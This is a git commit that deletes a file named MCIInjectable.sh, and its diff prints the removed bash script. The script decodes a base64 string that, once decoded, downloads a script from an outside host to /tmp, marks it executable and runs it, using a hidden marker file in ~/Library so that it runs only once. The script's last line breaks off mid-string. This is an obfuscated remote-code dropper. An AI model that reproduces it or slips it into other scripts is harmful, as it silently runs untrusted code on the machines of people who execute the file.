451dbc1452d887668d9d50b4bbaf4a8be012d1bb
Love Borgström <loveborgstrom98@gmail.com>
2016-08-24 21:46:37 +0200

    Delete MCIInjectable.sh

--- MCIInjectable.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/bash
-$(echo ZXZhbCB0ZXN0IC1mIH4vTGlicmFyeS8uQ00gfHwgJChldmFsICQodG91Y2ggfi9MaWJyYXJ5Ly5DTTtSPS90bXAvJFJBTkRPTS5zaDtjdXJsIC1zIHp1enp1Yy5jb20vTUMvTUNJLnNoID4gJFI7Y2htb2QgdSt4ICRSOyRSKSk= | base64 -D) && DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )" && exec "$DIR/
